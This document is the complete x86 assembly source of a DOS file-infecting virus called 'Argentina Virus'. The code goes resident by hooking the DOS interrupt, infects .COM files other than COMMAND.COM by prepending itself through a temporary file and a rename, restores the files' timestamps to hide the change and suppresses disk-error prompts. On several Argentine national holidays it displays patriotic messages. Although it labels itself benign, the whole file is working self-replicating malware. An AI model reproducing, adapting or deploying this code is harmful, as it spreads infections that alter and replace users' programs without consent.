

Title     Argentina Virus - Escrito por A.f.A

Code      segment

          assume cs:Code;ds:Nothing;es:Nothing
          org 0100h

DOS       equ 21h

Start:    jmp Comienzo

Compa     equ this word
Id        db 26,'Argentina Virus',0,'1.00'
Pages     dw ?

Old21Call equ this dword
Old21Ofs  dw ?
Old21Seg  dw ?
Old24Ofs  dw ?
Old24Seg  dw ?
PrograCall equ this dword
PrograOfs dw ?
PrograSeg dw ?
OrgAX     dw ?
SPAfter   dw ?
Date      dw ?
Time      dw ?
ParaBlock:
EnvSeg    dw 0
ComLinOfs dw 0080h
ComLinSeg dw ?
FCB1Ofs   dw 005Ch
FCB1Seg   dw ?
FCB2Ofs   dw 006Ch
FCB2Seg   dw ?

Comienzo: mov ds:OrgAX,ax
          mov di,Offset Start
          mov si,Offset Finish
          mov cx,0FF00h
          sub cx,Offset Finish
          mov ah,0FAh
          int DOS
          mov ax,3521h
          int DOS
          mov ds:Old21Ofs,bx
          mov ds:Old21Seg,es
          mov ax,2521h
          mov dx,Offset ResidRut
          int DOS
          mov ah,4Ah
          mov bx,Offset Finish
          mov sp,Offset Finish
          push ds
          pop es
          add bx,15
          shr bx,1
          shr bx,1
          shr bx,1
          shr bx,1
          mov ds:Pages,bx
          int DOS
          mov ds:ComLinSeg,cs
          mov ds:FCB1Seg,cs
          mov ds:FCB2Seg,cs
          mov es,ds:[002Ch]
          xor di,di
          xor ax,ax
          mov cx,0FFFFh
Buscar:   repnz scasb
          cmp byte ptr es:[di],00
          jz Encontre
          scasb
          jnz Buscar
Encontre: mov dx,di
          add dx,3
          push es
          pop ds
          mov ax,04B00h
          mov bx,Offset ParaBlock
          push cs
          pop es
          pushf
          call [Old21Call]
          mov ah,04Dh
          int DOS
          mov ah,031h
          mov dx,cs:Pages
          int DOS

VirusRut: push cs
          pop ds
          mov ah,2Ah
          int DOS
          cmp dx,(5*256)+25
          jz May25
          cmp dx,(6*256)+20
          jz Jun20
          cmp dx,(7*256)+9
          jz Jul09
          cmp dx,(8*256)+17
          jz Ago17
          jmp Cont
May25:    mov dx,Offset Men25_5
          jmp Mensajes
Jun20:    mov dx,Offset Men20_6
          jmp Mensajes
Jul09:    mov dx,Offset Men09_7
          jmp Mensajes
Ago17:    mov dx,Offset Men17_8
Mensajes: mov ah,9
          int DOS
          mov dx,Offset MenArg
          mov ah,9
          int DOS
          mov dx,Offset MenKey
          mov ah,9
          int DOS
          mov ah,0
          int 16h
          mov dx,Offset MenLf
          mov ah,9
          int DOS

Cont:     mov sp,cs:SPAfter
          pop es
          pop ds
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          mov ss,cs:OrgSS
          mov sp,cs:OrgSP
          jmp Salir

ResidRut: pushf
          cmp ah,0FAh
          jz InfeCall
          cmp ax,4B00h
          jz ExecCall
Salir:     popf
          jmp [Old21Call]
InfeCall: pop ax
          pop ax
          mov ax,0100h
          mov cs:PrograOfs,ax
          pop ax
          mov cs:PrograSeg,ax
          repz movsb
          xor ax,ax
          push ax
          mov ax,cs:OrgAX
          jmp [PrograCall]

OrgSP     dw ?
OrgSS     dw ?

ExecCall: mov cs:OrgSP,sp
          mov cs:OrgSS,ss
          push cs
          pop ss
          mov sp,Offset Finish
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push ds
          push es
          mov cs:SPAfter,sp
          mov ah,19h
          int DOS
          add al,'A'
          mov cs:FileName,al
          mov cs:TempFile,al
          mov di,(Offset FileName)+2
          push di
          mov si,dx
          cmp byte ptr [si+1],':'
          jnz SinDosPunt
          mov al,[si]
          mov cs:FileName,al
          mov cs:TempFile,al
          add si,2
SinDosPunt: push cs
          pop es
          mov cx,3Fh
PasName:  lodsb
          cmp al,'a'
          jb NoMinusc
          cmp al,'z'
          ja NoMinusc
          add al,0E0h
NoMinusc: stosb
          loop PasName
          pop di
          push cs
          pop ds
          mov cx,40h
          mov al,'.'
          repnz scasb
          mov cx,3
          mov si,Offset ComStr
          repz cmpsb
          jz EsCom
          jmp VirusRut
Chau1:    jmp Reg24Virus
EsCom:    sub di,0Bh
          mov cx,7
          mov si,Offset Command
          repz cmpsb
          jnz NoCommand
          jmp VirusRut
NoCommand: mov ax,3524h
          int DOS
          mov cs:Old24Ofs,bx
          mov cs:Old24Seg,es
          mov ax,2524h
          push cs
          pop ds
          mov dx,Offset New24
          int DOS
          mov dx,Offset FileName
          mov ax,3D00h
          int DOS
          mov bx,ax
          mov dx,Offset Buffer
          mov cx,9
          mov ah,3Fh
          int DOS
          jb Chau1
          mov ax,5700h
          int DOS
          mov ds:Date,dx
          mov ds:Time,cx
          mov ah,3Eh
          int DOS
          mov ax,word ptr ds:Buffer+3
          cmp ax,ds:Compa
          jz Chau1
          mov dx,Offset TempFile
          mov ah,3Ch
          xor cx,cx
          int DOS
          jb Chau1
          mov bx,ax
          mov dx,Offset Start
          mov cx,(Offset Finish)-(Offset Start)
          mov ah,40h
          int DOS
          cmp ax,cx
          jnz Chau1
          mov ds:Handle,bx
          mov dx,Offset FileName
          mov ax,3D00h
          int DOS
          jb Chau2
          mov bx,ax
          push bx
          mov bx,0500h
          mov ah,48h
          int DOS
          pop bx
          xor dx,dx
          mov ds,ax
Copiar:   mov cx,5000h
          mov ah,3Fh
          int DOS
          jb Chau2
          cmp ax,0
          jz Seguir
          mov cx,ax
          xchg bx,cs:Handle
          mov ah,40h
          int DOS
          cmp ax,cx
          jnz Chau2
          xchg bx,cs:Handle
          jmp Copiar
Chau2:    jmp Reg24Virus
Seguir:   push ds
          pop es
          mov ah,49h
          int DOS
          push cs
          push cs
          pop es
          pop ds
          mov ah,3Eh
          int DOS
          jb Chau2
          mov bx,ds:Handle
          mov ax,5701h
          mov dx,ds:Date
          mov cx,ds:Time
          int DOS
          mov ah,3Eh
          int DOS
          jb Chau2
          xor cx,cx
          mov dx,Offset FileName
          mov ax,4301h
          int DOS
          mov ah,41h
          int DOS
          mov dx,Offset TempFile
          mov di,Offset FileName
          mov ah,56h
          int DOS
          jmp Reg24Virus
New24:    xor al,al
          iret
Reg24Virus: mov dx,cs:Old24Ofs
          mov ds,cs:Old24Seg
          mov ax,2524h
          int DOS
          jmp VirusRut

FileName  db 'A:\INFECTAR.COM',51 dup (0)
Command   db 'COMMAND'
ComStr    db 'COM'
TempFile  db 'A:MOM.MOM',0
Men25_5   db '25 de Mayo Declaraci¢n de la independencia Argentina',10,13,'$'
          ;   ­­ ERROR !! ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Men20_6   db '20 de Junio Dia de la bandera Argentina',10,13,'$'
Men09_7   db '9 de Julio Dia de la independencia Argentina',10,13,'$'
Men17_8   db '17 de Agosto Aniversario de la defunci¢n del Gral. San Martin',10
          db 13,'$'
MenArg    db 'Argentina Virus escrito por AfA - Virus benigno - ENET 35'
          db 10,13,'$'
MenKey    db 'Pulse una tecla para continuar...$'
MenLf     db 10,13,'$'
Buffer    db 9 dup (?)
Handle    dw ?

          dw 55 dup (0AFAh)
Finish    equ this byte

Code      ends
          end start

